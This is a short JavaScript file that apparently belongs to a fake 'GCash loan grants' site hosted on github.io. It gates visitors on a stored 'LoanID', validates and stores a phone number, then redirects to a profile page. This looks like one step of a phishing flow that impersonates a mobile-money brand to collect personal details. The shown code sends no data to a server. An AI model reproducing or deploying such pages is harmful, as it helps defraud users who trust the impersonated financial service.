window.addEventListener("load", () => {
        if(!sessionStorage.getItem("LoanID")) {
            window.location.replace("https://gcash-loan-grants.github.io/get-grants/");
        }
    }
);
function validateForm() {
    if(document.getElementById("number-suffix").value == "") {
        document.querySelector(".error-msg").innerHTML = "*Fill in your phone number to apply";
    } else if(!document.getElementById("number-suffix").value.match(/^[0-9 ]*$/)) {
        document.querySelector(".error-msg").innerHTML = "*Invalid number or format";
    } else if(document.getElementById("number-suffix").value.toString().length != 12) {
        document.querySelector(".error-msg").innerHTML = "*Enter number with the specified pattern";
    } else {
        sessionStorage.setItem("phone", document.getElementById("number-prefix").value + " " + document.getElementById("number-suffix").value);
        if(sessionStorage.getItem("phone")) {
            document.querySelector(".submit-button").classList.add("hide-display");
            document.querySelector(".spinner-button").classList.remove("hide-display");
            setTimeout(() => {
                window.location.replace("https://gcash-loan-grants.github.io/get-grants/profile/");
            }, 1000);
        }
    }
}
function wipeError() {
    document.querySelector(".error-msg").innerHTML = "";
}